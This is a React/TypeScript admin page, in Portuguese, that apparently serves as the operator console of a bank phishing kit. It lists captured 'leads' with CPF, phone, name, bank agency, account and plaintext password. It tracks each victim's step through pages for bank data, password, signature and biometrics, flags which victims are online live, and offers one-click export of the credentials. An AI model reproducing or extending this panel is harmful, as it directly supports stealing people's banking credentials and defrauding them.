import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { leadRepository, type Lead } from "@/repositories";
import { Search, RefreshCw, Eye, EyeOff, Trash2, Copy, CheckSquare, Square, Archive, ArchiveRestore, Tag, X } from "lucide-react";
import {
  Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription,
} from "@/components/ui/dialog";
import { toast } from "sonner";

const STEP_LABELS: Record<string, string> = {
  splash: "Splash", inicio: "Início", "dados-bancarios": "Dados Bancários",
  resgate: "Resgate", senha: "Senha", assinatura: "Assinatura",
  biometria: "Biometria", concluido: "Concluído",
};

const PRESET_TAGS = ["Correu", "Caixa Postal", "Agendado", "Finalizado"];

export default function AdminLeadsPage() {
  const [leads, setLeads] = useState<Lead[]>([]);
  const [search, setSearch] = useState("");
  const [selected, setSelected] = useState<Lead | null>(null);
  const [loading, setLoading] = useState(true);
  const [loadingMore, setLoadingMore] = useState(false);
  const [checked, setChecked] = useState<Set<string>>(new Set());
  const [showArchived, setShowArchived] = useState(false);
  const [tagModalLead, setTagModalLead] = useState<Lead | null>(null);
  const [customTag, setCustomTag] = useState("");
  const [filterTag, setFilterTag] = useState("");
  const [nextCursor, setNextCursor] = useState<string | null>(null);
  const [visiblePwds, setVisiblePwds] = useState<Set<string>>(new Set());
  const [selectedPwdVisible, setSelectedPwdVisible] = useState(false);
  const [onlineLeadIds, setOnlineLeadIds] = useState<Set<string>>(new Set());

  const togglePwd = (id: string) =>
    setVisiblePwds((prev) => { const s = new Set(prev); s.has(id) ? s.delete(id) : s.add(id); return s; });

  const fetchOnlineLeadIds = async () => {
    const { data } = await supabase
      .from("site_sessions")
      .select("lead_id")
      .eq("is_online", true);
    setOnlineLeadIds(new Set((data ?? []).flatMap((s) => s.lead_id ? [s.lead_id] : [])));
  };

  const fetchLeads = async () => {
    setLoading(true);
    try {
      const result = await leadRepository.findAll({ archived: showArchived, limit: 50 });
      setLeads(result.data);
      setNextCursor(result.nextCursor);
      setChecked(new Set());
    } finally {
      setLoading(false);
    }
  };

  const fetchMore = async () => {
    if (!nextCursor || loadingMore) return;
    setLoadingMore(true);
    try {
      const result = await leadRepository.findAll({
        archived: showArchived,
        limit: 50,
        cursor: nextCursor,
      });
      setLeads((prev) => [...prev, ...result.data]);
      setNextCursor(result.nextCursor);
    } finally {
      setLoadingMore(false);
    }
  };

  useEffect(() => { fetchLeads(); fetchOnlineLeadIds(); }, [showArchived]);

  // Real-time updates
  useEffect(() => {
    const channel = supabase
      .channel("admin-leads")
      .on("postgres_changes", { event: "*", schema: "public", table: "leads" }, () => fetchLeads())
      .on("postgres_changes", { event: "*", schema: "public", table: "site_sessions" }, () => fetchOnlineLeadIds())
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [showArchived]);

  const allTags = Array.from(new Set(leads.flatMap((l) => l.tags ?? [])));

  const filtered = leads.filter((l) => {
    const q = search.toLowerCase();
    const matchSearch =
      l.cpf?.toLowerCase().includes(q) ||
      l.phone?.toLowerCase().includes(q) ||
      l.nome?.toLowerCase().includes(q) ||
      l.segment?.toLowerCase().includes(q);
    const matchTag = filterTag ? (l.tags ?? []).includes(filterTag) : true;
    return matchSearch && matchTag;
  });

  const toggleCheck = (id: string) => {
    setChecked((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id); else next.add(id);
      return next;
    });
  };

  const toggleAll = () => {
    if (checked.size === filtered.length) setChecked(new Set());
    else setChecked(new Set(filtered.map((l) => l.id)));
  };

  const handleDeleteSelected = async () => {
    if (checked.size === 0) return;
    if (!confirm(`Apagar ${checked.size} lead(s)? Esta ação é irreversível.`)) return;
    await leadRepository.bulkDelete(Array.from(checked));
    toast.success(`${checked.size} lead(s) apagado(s)`);
    fetchLeads();
  };

  const handleArchiveSelected = async () => {
    if (checked.size === 0) return;
    const newVal = !showArchived;
    await leadRepository.bulkUpdate(Array.from(checked), { archived: newVal });
    toast.success(`${checked.size} lead(s) ${newVal ? "arquivado(s)" : "desarquivado(s)"}`);
    fetchLeads();
  };

  const handleCopySelected = () => {
    const toCopy = leads.filter((l) => checked.has(l.id));
    if (toCopy.length === 0) return;
    const text = toCopy.map((l) =>
      [l.cpf, l.phone, l.nome, l.segment, l.agency, l.account, l.password, STEP_LABELS[l.current_step] || l.current_step].join("\t")
    ).join("\n");
    const header = "CPF\tTelefone\tNome\tSegmento\tAgência\tConta\tSenha\tEtapa";
    navigator.clipboard.writeText(header + "\n" + text);
    toast.success(`${toCopy.length} lead(s) copiado(s)`);
  };

  const handleCopyOne = (lead: Lead) => {
    const text = [
      `CPF: ${lead.cpf || "—"}`,
      `Telefone: ${lead.phone || "—"}`,
      `Nome: ${lead.nome || "—"}`,
      `Segmento: ${lead.segment || "—"}`,
      `Agência: ${lead.agency || "—"}`,
      `Conta: ${lead.account || "—"}`,
      `Senha: ${lead.password || "—"}`,
      `Etapa: ${STEP_LABELS[lead.current_step] || lead.current_step}`,
      `Tags: ${(lead.tags ?? []).join(", ") || "—"}`,
    ].join("\n");
    navigator.clipboard.writeText(text);
    toast.success("Dados copiados");
  };

  const handleAddTag = async (lead: Lead, tag: string) => {
    if (!tag.trim()) return;
    const current = lead.tags ?? [];
    if (current.includes(tag.trim())) return;
    const updated = [...current, tag.trim()];
    await leadRepository.update(lead.id, { tags: updated });
    setLeads((prev) => prev.map((l) => l.id === lead.id ? { ...l, tags: updated } : l));
    setTagModalLead((prev) => prev && prev.id === lead.id ? { ...prev, tags: updated } : prev);
    toast.success(`Tag "${tag.trim()}" adicionada`);
  };

  const handleRemoveTag = async (lead: Lead, tag: string) => {
    const updated = (lead.tags ?? []).filter((t) => t !== tag);
    await leadRepository.update(lead.id, { tags: updated });
    setLeads((prev) => prev.map((l) => l.id === lead.id ? { ...l, tags: updated } : l));
    setTagModalLead((prev) => prev && prev.id === lead.id ? { ...prev, tags: updated } : prev);
  };

  // Fixed N+1: was doing 1 DB call per lead — now 1 call total via append_tag_to_leads RPC.
  const handleBulkTag = async (tag: string) => {
    if (checked.size === 0 || !tag.trim()) return;
    await leadRepository.bulkAddTag(Array.from(checked), tag.trim());
    toast.success(`Tag "${tag.trim()}" aplicada a ${checked.size} lead(s)`);
    fetchLeads();
  };

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between flex-wrap gap-2">
        <h1 className="text-xl font-bold text-foreground font-mono tracking-tight">
          {showArchived ? "// Leads Arquivados" : "// Leads"}
        </h1>
        <div className="flex items-center gap-2 flex-wrap">
          {checked.size > 0 && (
            <>
              <button onClick={handleCopySelected} className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
                <Copy className="h-3.5 w-3.5" /> Copiar ({checked.size})
              </button>
              <button onClick={handleArchiveSelected} className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
                {showArchived ? <ArchiveRestore className="h-3.5 w-3.5" /> : <Archive className="h-3.5 w-3.5" />}
                {showArchived ? "Desarquivar" : "Arquivar"} ({checked.size})
              </button>
              <div className="relative group">
                <button className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors">
                  <Tag className="h-3.5 w-3.5" /> Tag ({checked.size})
                </button>
                <div className="absolute right-0 top-full mt-1 w-40 rounded-lg border border-border bg-card shadow-lg hidden group-hover:block z-50">
                  {PRESET_TAGS.map((tag) => (
                    <button key={tag} onClick={() => handleBulkTag(tag)} className="block w-full text-left px-3 py-2 text-sm hover:bg-muted transition-colors text-foreground">
                      {tag}
                    </button>
                  ))}
                </div>
              </div>
              <button onClick={handleDeleteSelected} className="flex items-center gap-1.5 rounded-lg border border-destructive/30 bg-destructive/10 px-3 py-2 text-sm font-medium text-destructive hover:bg-destructive/20 transition-colors">
                <Trash2 className="h-3.5 w-3.5" /> Apagar ({checked.size})
              </button>
            </>
          )}
          <button
            onClick={() => setShowArchived((v) => !v)}
            className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-2 text-sm text-muted-foreground hover:bg-muted transition-colors"
          >
            {showArchived ? <ArchiveRestore className="h-4 w-4" /> : <Archive className="h-4 w-4" />}
            {showArchived ? "Ver Ativos" : "Ver Arquivados"}
          </button>
          <button onClick={fetchLeads} className="flex items-center gap-2 rounded-lg border border-border px-3 py-2 text-sm text-muted-foreground hover:bg-muted transition-colors">
            <RefreshCw className="h-4 w-4" /> Atualizar
          </button>
        </div>
      </div>

      <div className="flex gap-2">
        <div className="relative flex-1">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
          <input
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Buscar por CPF, telefone, nome, segmento..."
            className="w-full rounded-lg border border-border bg-muted/30 pl-10 pr-4 py-2.5 text-sm text-foreground placeholder:text-muted-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
          />
        </div>
        {allTags.length > 0 && (
          <select
            value={filterTag}
            onChange={(e) => setFilterTag(e.target.value)}
            className="rounded-lg border border-border bg-muted/30 px-3 py-2.5 text-sm text-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
          >
            <option value="">Todas as tags</option>
            {allTags.map((t) => (
              <option key={t} value={t}>{t}</option>
            ))}
          </select>
        )}
      </div>

      <div className="rounded-xl border border-border bg-card overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-border bg-muted/50">
                <th className="px-3 py-3 text-center">
                  <button onClick={toggleAll} className="text-muted-foreground hover:text-foreground transition-colors">
                    {checked.size === filtered.length && filtered.length > 0 ? <CheckSquare className="h-4 w-4" /> : <Square className="h-4 w-4" />}
                  </button>
                </th>
                <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">CPF</th>
                <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Telefone</th>
                <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Nome</th>
                <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Segmento</th>
                <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Agência</th>
                <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Conta</th>
                <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Senha</th>
                <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Etapa</th>
                <th className="px-4 py-3 text-left font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Tags</th>
                <th className="px-4 py-3 text-center font-mono text-[10px] tracking-wider text-muted-foreground uppercase">Ações</th>
              </tr>
            </thead>
            <tbody>
              {loading ? (
                <tr><td colSpan={11} className="px-4 py-8 text-center text-muted-foreground font-mono text-xs">Carregando...</td></tr>
              ) : filtered.length === 0 ? (
                <tr><td colSpan={11} className="px-4 py-8 text-center text-muted-foreground font-mono text-xs">Nenhum lead encontrado</td></tr>
              ) : (
                filtered.map((lead) => (
                  <tr key={lead.id} className={`border-b border-border last:border-0 hover:bg-muted/30 transition-colors ${checked.has(lead.id) ? "bg-primary/5" : ""}`}>
                    <td className="px-3 py-3 text-center">
                      <button onClick={() => toggleCheck(lead.id)} className="text-muted-foreground hover:text-foreground transition-colors">
                        {checked.has(lead.id) ? <CheckSquare className="h-4 w-4 text-primary" /> : <Square className="h-4 w-4" />}
                      </button>
                    </td>
                    <td className="px-4 py-3 font-mono text-xs text-foreground">
                      <span className="flex items-center gap-1.5">
                        {onlineLeadIds.has(lead.id) && (
                          <span className="relative flex h-1.5 w-1.5 shrink-0">
                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                            <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-400" />
                          </span>
                        )}
                        {lead.cpf || "—"}
                      </span>
                    </td>
                    <td className="px-4 py-3 font-mono text-xs text-muted-foreground">{lead.phone || "—"}</td>
                    <td className="px-4 py-3 text-xs text-foreground">{lead.nome || "—"}</td>
                    <td className="px-4 py-3">
                      {lead.segment ? (
                        <span className="inline-block rounded-full bg-primary/15 px-2 py-0.5 text-xs font-medium text-primary">{lead.segment}</span>
                      ) : "—"}
                    </td>
                    <td className="px-4 py-3 font-mono text-xs text-muted-foreground">{lead.agency || "—"}</td>
                    <td className="px-4 py-3 font-mono text-xs text-muted-foreground">{lead.account || "—"}</td>
                    <td className="px-4 py-3 font-mono text-xs font-bold text-foreground">
                      <span className="inline-flex items-center gap-1">
                        {lead.password
                          ? (visiblePwds.has(lead.id) ? lead.password : "••••••")
                          : "—"}
                        {lead.password && (
                          <button onClick={() => togglePwd(lead.id)} className="text-muted-foreground hover:text-foreground transition-colors">
                            {visiblePwds.has(lead.id) ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                          </button>
                        )}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <span className={`inline-block rounded-full px-2 py-0.5 text-xs font-medium ${
                        lead.status === "concluido"
                          ? "bg-emerald-500/20 text-emerald-400"
                          : "bg-orange-500/20 text-orange-400"
                      }`}>
                        {STEP_LABELS[lead.current_step] || lead.current_step}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex flex-wrap gap-1">
                        {(lead.tags ?? []).map((tag) => (
                          <span key={tag} className="inline-flex items-center gap-0.5 rounded-full bg-primary/15 px-2 py-0.5 text-[10px] font-medium text-primary">
                            {tag}
                            <button onClick={() => handleRemoveTag(lead, tag)} className="hover:text-destructive">
                              <X className="h-2.5 w-2.5" />
                            </button>
                          </span>
                        ))}
                        <button onClick={() => setTagModalLead(lead)} className="rounded-full border border-dashed border-border p-0.5 text-muted-foreground hover:text-foreground hover:border-foreground transition-colors">
                          <Tag className="h-3 w-3" />
                        </button>
                      </div>
                    </td>
                    <td className="px-4 py-3 text-center">
                      <div className="flex items-center justify-center gap-1">
                        <button onClick={() => handleCopyOne(lead)} title="Copiar dados" className="rounded-lg p-1.5 text-muted-foreground hover:bg-muted hover:text-foreground transition-colors">
                          <Copy className="h-4 w-4" />
                        </button>
                        <button onClick={() => setSelected(lead)} title="Ver detalhes" className="rounded-lg p-1.5 text-muted-foreground hover:bg-muted hover:text-foreground transition-colors">
                          <Eye className="h-4 w-4" />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>

      {nextCursor && (
        <div className="flex justify-center pt-2">
          <button
            onClick={fetchMore}
            disabled={loadingMore}
            className="rounded-lg border border-border px-4 py-2 text-sm text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50"
          >
            {loadingMore ? "Carregando..." : "Carregar mais"}
          </button>
        </div>
      )}

      <Dialog open={!!selected} onOpenChange={() => { setSelected(null); setSelectedPwdVisible(false); }}>
        <DialogContent>
          <DialogHeader>
            <DialogTitle>Ficha do Lead</DialogTitle>
            <DialogDescription>Detalhes completos</DialogDescription>
          </DialogHeader>
          {selected && (
            <div className="space-y-3 text-sm">
              {[
                ["CPF", selected.cpf],
                ["Telefone", selected.phone],
                ["Nome", selected.nome],
                ["Segmento", selected.segment],
                ["Agência", selected.agency],
                ["Conta", selected.account],
                ["Etapa Atual", STEP_LABELS[selected.current_step] || selected.current_step],
                ["Status", selected.status === "concluido" ? "Concluído" : "Em andamento"],
                ["Tags", (selected.tags ?? []).join(", ") || "—"],
                ["Criado em", new Date(selected.created_at).toLocaleString("pt-BR")],
                ["Atualizado", new Date(selected.updated_at).toLocaleString("pt-BR")],
              ].map(([label, value]) => (
                <div key={label} className="flex justify-between border-b border-border pb-2 last:border-0">
                  <span className="text-muted-foreground font-mono text-xs">{label}</span>
                  <span className="font-medium text-foreground text-xs font-mono">{value || "—"}</span>
                </div>
              ))}
              <div className="flex justify-between border-b border-border pb-2">
                <span className="text-muted-foreground font-mono text-xs">Senha</span>
                <span className="inline-flex items-center gap-1 font-medium text-foreground text-xs font-mono">
                  {selected.password
                    ? (selectedPwdVisible ? selected.password : "••••••")
                    : "—"}
                  {selected.password && (
                    <button onClick={() => setSelectedPwdVisible((v) => !v)} className="text-muted-foreground hover:text-foreground transition-colors">
                      {selectedPwdVisible ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
                    </button>
                  )}
                </span>
              </div>
              <button
                onClick={() => { handleCopyOne(selected); }}
                className="mt-2 flex w-full items-center justify-center gap-2 rounded-lg border border-border py-2 text-sm font-medium text-foreground hover:bg-muted transition-colors"
              >
                <Copy className="h-4 w-4" /> Copiar dados
              </button>
            </div>
          )}
        </DialogContent>
      </Dialog>

      <Dialog open={!!tagModalLead} onOpenChange={() => { setTagModalLead(null); setCustomTag(""); }}>
        <DialogContent className="max-w-sm">
          <DialogHeader>
            <DialogTitle>Gerenciar Tags</DialogTitle>
            <DialogDescription>{tagModalLead?.cpf || tagModalLead?.nome || "Lead"}</DialogDescription>
          </DialogHeader>
          {tagModalLead && (
            <div className="space-y-4">
              <div className="flex flex-wrap gap-1.5">
                {(tagModalLead.tags ?? []).map((tag) => (
                  <span key={tag} className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2.5 py-1 text-xs font-medium text-primary">
                    {tag}
                    <button onClick={() => handleRemoveTag(tagModalLead, tag)} className="hover:text-destructive">
                      <X className="h-3 w-3" />
                    </button>
                  </span>
                ))}
              </div>
              <div>
                <p className="text-xs font-mono text-muted-foreground mb-2 uppercase tracking-wider">Tags rápidas</p>
                <div className="flex flex-wrap gap-1.5">
                  {PRESET_TAGS.filter((t) => !(tagModalLead.tags ?? []).includes(t)).map((tag) => (
                    <button
                      key={tag}
                      onClick={() => handleAddTag(tagModalLead, tag)}
                      className="rounded-full border border-border px-2.5 py-1 text-xs font-medium text-muted-foreground hover:bg-muted hover:text-foreground transition-colors"
                    >
                      + {tag}
                    </button>
                  ))}
                </div>
              </div>
              <div className="flex gap-2">
                <input
                  value={customTag}
                  onChange={(e) => setCustomTag(e.target.value)}
                  onKeyDown={(e) => {
                    if (e.key === "Enter") {
                      handleAddTag(tagModalLead, customTag);
                      setCustomTag("");
                    }
                  }}
                  placeholder="Tag personalizada..."
                  className="flex-1 rounded-lg border border-border bg-muted/30 px-3 py-2 text-sm text-foreground placeholder:text-muted-foreground outline-none focus:border-primary focus:ring-1 focus:ring-primary transition-colors"
                />
                <button
                  onClick={() => { handleAddTag(tagModalLead, customTag); setCustomTag(""); }}
                  className="rounded-lg bg-primary px-3 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90 transition-colors"
                >
                  Adicionar
                </button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
